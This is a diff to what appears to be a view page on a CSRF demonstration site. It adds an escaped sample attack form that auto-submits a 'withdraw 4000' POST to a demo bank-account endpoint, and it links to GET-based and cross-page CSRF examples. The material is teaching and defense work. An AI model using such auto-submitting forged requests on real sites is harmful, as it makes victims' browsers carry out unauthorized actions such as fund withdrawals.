@@ -45,3 +45,18 @@
 </div>
 <a href="http://jsfiddle.net/4R7Hn/">Get based csrf attack.</a>
 <a href="http://jsfiddle.net/LGwjM/">Cross page forms post csrf attack.</a>
+
+<pre>
+ Here is a form which can be used for your current session:
+    <pre>
+        &lt;form action="http://csrf.apphb.com/BankAccount/Secure" id="attack" method="post"&gt;
+            &lt;input value="4000" name="amount"&gt;
+            &lt;input value="withdraw" name="mode"&gt;
+            @Html.Encode(@Html.AntiForgeryToken())
+        &lt;/form&gt;
+        &lt;/script type="javascript"&gt;
+            document.getElementById('attack').submit();
+        &lt;/script&gt;
+    </pre>
+</pre>
+
